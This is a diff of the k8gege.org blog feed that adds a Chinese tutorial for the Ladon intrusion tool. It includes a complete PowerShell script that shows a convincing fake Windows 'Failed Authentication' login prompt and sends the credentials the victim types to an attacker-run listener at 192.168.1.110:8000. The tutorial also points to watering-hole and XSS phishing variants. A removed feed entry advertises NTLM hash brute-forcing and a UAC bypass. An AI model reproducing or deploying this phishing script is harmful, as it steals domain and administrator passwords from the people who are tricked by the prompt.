@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://k8gege.org/"/>
-  <updated>2020-08-07T13:54:37.847Z</updated>
+  <updated>2020-08-11T13:31:19.671Z</updated>
   <id>http://k8gege.org/</id>
   
   <author>
@@ -15,6 +15,34 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>〖教程〗使用Ladon捕获Windonws登陆密码</title>
+    <link href="http://k8gege.org/p/GetWinAuth.html"/>
+    <id>http://k8gege.org/p/GetWinAuth.html</id>
+    <published>2020-08-11T12:10:00.000Z</published>
+    <updated>2020-08-11T13:31:19.671Z</updated>
+    
+    <content type="html"><![CDATA[<p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p><script language="javascript" type="text/javascript">window.location.href="http://k8gege.org/Ladon/GetWinAuth.html";</script><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><p>&gt;= Ladon 6.6.3</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>使用PowerShell模仿Windowns登陆认证获取管理员密码，Ladon监听捕获基础认证密码。</p><h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><p>域控或管理员密码获取，当前权限很低又无法提权时。（有权限直接读明文或HASH）</p><h3 id="Ladon监听"><a href="#Ladon监听" class="headerlink" title="Ladon监听"></a>Ladon监听</h3><p>该功能模仿了MSF里的基础认证监听模块，但最大的优势在于无需占用系统大量空间和内存。<br>可直接部署在目标内网或VPS上，也无需复杂命令，直接输以下命令一键监听自动捕获密码。<br>其它用途：<a href="http://k8gege.org/Ladon/webser.html">http://k8gege.org/Ladon/webser.html</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon Web 800</span><br></pre></td></tr></table></figure><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/AuthPass.PNG"></p><h3 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h3><p>执行以下脚本代码，会弹出十分逼真的基础认证登陆窗口，自动获取用户名和域来提高真实性。<br>当然也可以使用其它脚本或语言，如JS水坑攻击、XSS截取各种WEB邮箱密码等等多种钩鱼姿势。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cred</span> = <span class="variable">$host</span>.ui.promptforcredential(<span class="string">'Failed Authentication'</span>,<span class="string">''</span>,[<span class="type">Environment</span>]::UserDomainName + <span class="string">"\"</span> + [<span class="type">Environment</span>]::UserName,[<span class="type">Environment</span>]::UserDomainName);</span><br><span class="line">[<span class="type">System.Net.ServicePointManager</span>]::ServerCertificateValidationCallback = &#123;<span class="variable">$true</span>&#125;;</span><br><span class="line"><span class="built_in">Add-Type</span> <span class="string">@'</span></span><br><span class="line"><span class="string">using System;</span></span><br><span class="line"><span class="string">public class Authorization</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">public static void submit(string usr,string pwd)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">string url = "http://192.168.1.110:8000/";</span></span><br><span class="line"><span class="string">System.Net.HttpWebRequest myReq = (System.Net.HttpWebRequest)System.Net.WebRequest.Create(url);</span></span><br><span class="line"><span class="string">string username = usr;</span></span><br><span class="line"><span class="string">string password = pwd;</span></span><br><span class="line"><span class="string">string usernamePassword = username + ":" + password;</span></span><br><span class="line"><span class="string">System.Net.CredentialCache mycache = new System.Net.CredentialCache();</span></span><br><span class="line"><span class="string">mycache.Add(new Uri(url), "Basic", new System.Net.NetworkCredential(username, password));</span></span><br><span class="line"><span class="string">myReq.Credentials = mycache;</span></span><br><span class="line"><span class="string">myReq.Headers.Add("Authorization", "Basic " + Convert.ToBase64String(new System.Text.ASCIIEncoding().GetBytes(usernamePassword)));</span></span><br><span class="line"><span class="string">System.Net.WebResponse wr = myReq.GetResponse();</span></span><br><span class="line"><span class="string">&#125;&#125;</span></span><br><span class="line"><span class="string">'@</span></span><br><span class="line">[<span class="type">Authorization</span>]::submit(<span class="variable">$cred</span>.username, <span class="variable">$cred</span>.getnetworkcredential().password)</span><br></pre></td></tr></table></figure><h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p><div style="text-align: center; width: 710px; border: green solid 0px;"><img alt style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg"></div>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;=============================================================================================&lt;br&gt;++++++++++++++++++++++++++++++++++++++++
+      
+    
+    </summary>
+    
+    
+      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+    
+      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
+    
+      <category term="Pass" scheme="http://k8gege.org/tags/Pass/"/>
+    
+  </entry>
   
   <entry>
     <title>给你一个免费加入&quot;K8小密圈&quot;的机会</title>
@@ -418,13 +446,13 @@
     </summary>
     
     
-      <category term="Cobalt Strike" scheme="http://k8gege.org/categories/CS/"/>
-    
       <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
     
-      <category term="远程执行" scheme="http://k8gege.org/categories/Rce/"/>
+      <category term="Cobalt Strike" scheme="http://k8gege.org/categories/CS/"/>
     
       <category term="内网渗透" scheme="http://k8gege.org/categories/Lan-Pentest/"/>
+    
+      <category term="远程执行" scheme="http://k8gege.org/categories/Rce/"/>
     
     
       <category term="Cobalt Strike" scheme="http://k8gege.org/tags/CS/"/>
@@ -567,50 +595,14 @@
     
       <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
     
-      <category term="内网渗透" scheme="http://k8gege.org/categories/Lan-Pentest/"/>
-    
       <category term="主机发现" scheme="http://k8gege.org/categories/OnlinePC/"/>
+    
+      <category term="内网渗透" scheme="http://k8gege.org/categories/Lan-Pentest/"/>
     
       <category term="信息收集" scheme="http://k8gege.org/categories/Discover/"/>
     
     
       <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Ladon 6.2新增Ntlm Hash爆破每分钟可破4万个密码</title>
-    <link href="http://k8gege.org/p/39070.html"/>
-    <id>http://k8gege.org/p/39070.html</id>
-    <published>2020-03-30T11:00:00.000Z</published>
-    <updated>2020-06-04T12:31:21.048Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>天下武功,无坚不破,唯快不破。扫描速度 SMB &gt; Wmi ，但是SMB通不代表WMI通。<br>每秒700个左右，换句话说你只收集到500个密码，验证一个C段也就一分钟左右。</p><h3 id="Ladon6-2更新功能"><a href="#Ladon6-2更新功能" class="headerlink" title="Ladon6.2更新功能"></a>Ladon6.2更新功能</h3><p>ID | 模块名称 |  功能说明  | 返回结果<br>-|-|-|-|-<br>0 | <a href="https://github.com/k8gege/Ladon/wiki/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F" target="_blank" rel="noopener">OnlinePC</a> | 存活主机扫描 | 存活IP、Mac地址、机器名、设备制造商<br>1 | <a href="http://k8gege.org/p/39070.html">SmbHashScan</a>  |  SMB HASH密码爆破(Windows) | 检测过程、成功密码、LOG文件 |<br>2 | <a href="http://k8gege.org/p/39070.html">WmiHashScan</a>  |  WMI HASH密码爆破(Windows) | 检测过程、成功密码、LOG文件 |<br>3 | <a href="http://k8gege.org/p/39070.html">BypassUac</a>   | 绕过UAC执行,支持Win7-Win10 | Ladon BypassUac c:\1.exe<br>4 | <a href="http://k8gege.org/p/39070.html">EnableDotNet</a>   | 一键启用.net 3.5(2008系统默认未启用) | Ladon EnableDotNet<br>5 | <a href="http://k8gege.org/p/39070.html">gethtml</a>   | 获取内网站点HTML源码 | Ladon gethtml <a href="http://192.168.1.1" target="_blank" rel="noopener">http://192.168.1.1</a><br>6 | <a href="http://k8gege.org/p/39070.html">AdiDnsDump</a>  | 域内机器信息获取(非域内请使用LdapScan探测) | IP、域名<br>7 | <a href="http://k8gege.org/p/39070.html">LdapScan</a>  | 不指定密码时，仅探测LDAP服务器 | IP是否LDAP服务器<br>8 | <a href="http://k8gege.org/p/39070.html">FtpScan</a>  | 不指定密码时，仅探测FTP服务器 | IP是否FTP服务器<br>9| <a href="http://k8gege.org/p/c5430395.html">Ladon.cna</a> | CobaltStrike 3.x-4.0右键菜单 | 一键扫描内网<br>10 命令支持CIDR格式IP扫描<br>11 INI配置支持自定义密码爆破<br>12 PortScan命令行支持自定义端口</p><h3 id="BUG修复"><a href="#BUG修复" class="headerlink" title="BUG修复"></a>BUG修复</h3><p>修复SmbScan遇到%非数字密码停止的BUG<br>修复一些模块扫描TXT列表崩溃的BUG<br>修复LdapScan扫描check.txt只检测一个的bug</p><h3 id="SmbHash密码爆破"><a href="#SmbHash密码爆破" class="headerlink" title="SmbHash密码爆破"></a>SmbHash密码爆破</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/smbhash.PNG"></p><h3 id="WmiHash密码爆破"><a href="#WmiHash密码爆破" class="headerlink" title="WmiHash密码爆破"></a>WmiHash密码爆破</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/WmiHash.PNG"></p><h3 id="LDAP服务器识别"><a href="#LDAP服务器识别" class="headerlink" title="LDAP服务器识别"></a>LDAP服务器识别</h3><p>目录下无帐密或相关文件时，使用LDAP协议探测服务器。<br><img alt data-original="http://k8gege.org/k8img/Ladon/exe/LdapScan0.PNG"></p><h3 id="Ftp服务器识别"><a href="#Ftp服务器识别" class="headerlink" title="Ftp服务器识别"></a>Ftp服务器识别</h3><p>目录下无帐密或相关文件时，使用FTP协议探测服务器。<br><img alt data-original="http://k8gege.org/k8img/Ladon/exe/FtpScan0.PNG"></p><h3 id="自定义密码爆破"><a href="#自定义密码爆破" class="headerlink" title="自定义密码爆破"></a>自定义密码爆破</h3><p>详见：<a href="http://k8gege.org/p/53177.html">http://k8gege.org/p/53177.html</a><br><img alt data-original="http://k8gege.org/k8img/Ladon/exe/DiyIniPwd.PNG"></p><h3 id="OnlinePC存活主机"><a href="#OnlinePC存活主机" class="headerlink" title="OnlinePC存活主机"></a>OnlinePC存活主机</h3><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/OnlinePC6.2.png"></p><h3 id="PortScan端口扫描"><a href="#PortScan端口扫描" class="headerlink" title="PortScan端口扫描"></a>PortScan端口扫描</h3><p>命令行支持自定义端口，而不是非要ports.txt指定端口<br>Ladon 192.168.1.8-192.168.1.200 PortScan 22,80,1433,21,3306,1521<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/PortScan6.2.PNG"></p><h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;天下武功,无坚不破,唯快不破。扫描速度 SMB &amp;gt; Wmi ，但是SMB通不代表WMI通。&lt;br&gt;每秒700个左右，换句话说你只收集到
-      
-    
-    </summary>
-    
-    
-      <category term="Kali" scheme="http://k8gege.org/categories/Kali/"/>
-    
-      <category term="密码" scheme="http://k8gege.org/categories/Pass/"/>
-    
-      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
-    
-    
-      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
-    
-      <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
-    
-      <category term="Kali" scheme="http://k8gege.org/tags/Kali/"/>
-    
-      <category term="Scanner" scheme="http://k8gege.org/tags/Scanner/"/>
     
   </entry>
   
